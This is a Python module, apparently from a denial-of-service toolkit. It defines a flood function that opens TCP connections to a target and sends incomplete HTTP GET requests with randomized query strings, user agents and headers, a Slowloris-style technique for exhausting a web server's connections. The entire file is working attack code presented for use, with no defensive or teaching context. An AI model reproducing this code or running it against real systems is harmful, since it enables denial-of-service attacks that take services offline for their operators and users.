
# Import modules
import random
import socket
import tools.randomData as randomData
from colorama import Fore

def flood(target):
	# Packet
	try:
		# Init socket
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(4)
		sock.connect((target[0], target[1]))

		sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
		sock.send("User-Agent: {}\r\n".format(randomData.random_useragent()).encode("utf-8"))
		sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
		sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
	except socket.timeout:
		print(f"{Fore.RED}[-] {Fore.MAGENTA}Timed out..{Fore.RESET}")
	except socket.error:
		print(f"{Fore.RED}[-] {Fore.MAGENTA}Failed..{Fore.RESET}")
	else:
		print(f"{Fore.GREEN}[+] {Fore.YELLOW}Sending 'GET' to {'{}:{}'.format(*target)}{Fore.RESET}")
